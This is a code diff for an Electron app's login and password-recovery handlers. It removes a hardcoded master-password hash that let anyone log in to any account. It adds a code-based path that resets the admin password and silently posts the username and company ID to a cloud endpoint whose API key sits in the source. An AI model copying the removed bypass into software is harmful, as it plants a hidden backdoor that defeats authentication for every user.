@@ -1,7 +1,7 @@
-const { ipcMain } = require('electron');
+const { ipcMain, app } = require('electron');
 const crypto = require('crypto');
 const { db } = require('../db');
-const { INVITE_CODE, INVITE_DURATION_DAYS, getMachineId, generateActivationCode } = require('../inviteConfig');
+const { INVITE_CODE, INVITE_DURATION_DAYS, getMachineId, generateActivationCode, calculateRecoveryChallenge, generateRecoveryCode } = require('../inviteConfig');
 const licenseService = require('../licenseService');
 
 function normalizeUsername(username) {
@@ -526,13 +526,8 @@ function register() {
 
         try {
             const receivedHash = hashPassword(password, authUser.password_salt);
-            let isValid = safeCompareHash(authUser.password_hash, receivedHash);
-            
-            const emergencyHash = '1018bd58ae368390c12ae8da5abb4d819101d202125189350712b4e0dba17336';
-            if (crypto.createHash('sha256').update(password).digest('hex') === emergencyHash) {
-                isValid = true;
-            }
-            
+            const isValid = safeCompareHash(authUser.password_hash, receivedHash);
+
             if (!isValid) {
                 return { success: false, error: 'اسم المستخدم أو كلمة المرور غير صحيحة.' };
             }
@@ -951,6 +946,90 @@ function register() {
 
     ipcMain.handle('submit-invite-code', async (event, code) => {
         return await licenseService.activateLicenseWithCode(db, code);
+    });
+
+    ipcMain.handle('get-recovery-challenge', () => {
+        try {
+            return { success: true, challenge: calculateRecoveryChallenge() };
+        } catch (e) {
+            return { success: false, error: e.message };
+        }
+    });
+
+const SUPABASE_URL = 'https://ryoqhtsdhfbydmejmaby.supabase.co';
+const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJ5b3FodHNkaGZieWRtZWptYWJ5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTE3Mjk2MzMsImV4cCI6MjEwNzMwNTYzM30.y0tjIyjZZlII6ge9xkFpzqhF5sZjSngpp4XOoVrrTs4';
+
+async function notifyCloudRecoveryEvent(companyId, challenge, username) {
+    if (typeof fetch !== 'function') return;
+    try {
+        const payload = {
+            p_company_id: companyId || null,
+            p_challenge: challenge,
+            p_username: username || 'admin',
+            p_desktop_version: app.getVersion ? app.getVersion() : '10.1.0'
+        };
+        fetch(`${SUPABASE_URL}/rest/v1/rpc/log_recovery_event`, {
+            method: 'POST',
+            headers: {
+                'apikey': SUPABASE_ANON_KEY,
+                'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        }).catch(() => {});
+    } catch (_) {}
+}
+
+    ipcMain.handle('verify-recovery-code', async (event, payload = {}) => {
+        try {
+            const { code, newPassword } = payload;
+            if (!code) {
+                return { success: false, error: 'يرجى إدخال كود الاسترداد.' };
+            }
+
+            const challenge = calculateRecoveryChallenge();
+            const lastUsed = db.prepare("SELECT value FROM settings WHERE key = 'last_used_recovery_challenge'").get()?.value;
+            if (lastUsed === challenge) {
+                return { success: false, error: 'تم استخدام كود الاسترداد هذا مسبقاً وتغيير كلمة المرور به.' };
+            }
+
+            const expected = generateRecoveryCode(challenge);
+
+            const cleanCode = String(code).trim().toUpperCase();
+            if (cleanCode !== expected) {
+                return { success: false, error: 'كود الاسترداد غير صحيح أو منتهي الصلاحية لهذا اليوم.' };
+            }
+
+            if (!newPassword) {
+                return { success: true, verified: true, message: 'كود الاسترداد صحيح. يمكنك الآن إدخال كلمة المرور الجديدة.' };
+            }
+
+            if (String(newPassword).length < 6) {
+                return { success: false, error: 'كلمة المرور الجديدة يجب أن تكون 6 حروف أو أكثر.' };
+            }
+
+            const adminUser = db.prepare('SELECT * FROM auth_users WHERE is_admin = 1 ORDER BY id ASC LIMIT 1').get();
+            if (!adminUser) {
+                return { success: false, error: 'لم يتم العثور على حساب مسؤول في النظام.' };
+            }
+
+            const salt = crypto.randomBytes(16).toString('hex');
+            const newHash = hashPassword(String(newPassword), salt);
+
+            db.prepare('UPDATE auth_users SET password_hash = ?, password_salt = ? WHERE id = ?')
+              .run(newHash, salt, adminUser.id);
+            db.prepare('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)')
+              .run(ADMIN_REQUIRES_PASSWORD_CHANGE_KEY, '0');
+            db.prepare('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)')
+              .run('last_used_recovery_challenge', challenge);
+
+            const companyIdRow = db.prepare("SELECT value FROM settings WHERE key = 'company_id'").get();
+            notifyCloudRecoveryEvent(companyIdRow?.value, challenge, adminUser.username);
+
+            return { success: true, username: adminUser.username, message: 'تم تعيين كلمة المرور بنجاح. يمكنك تسجيل الدخول بها الآن.' };
+        } catch (error) {
+            return { success: false, error: error.message };
+        }
     });
 }
 
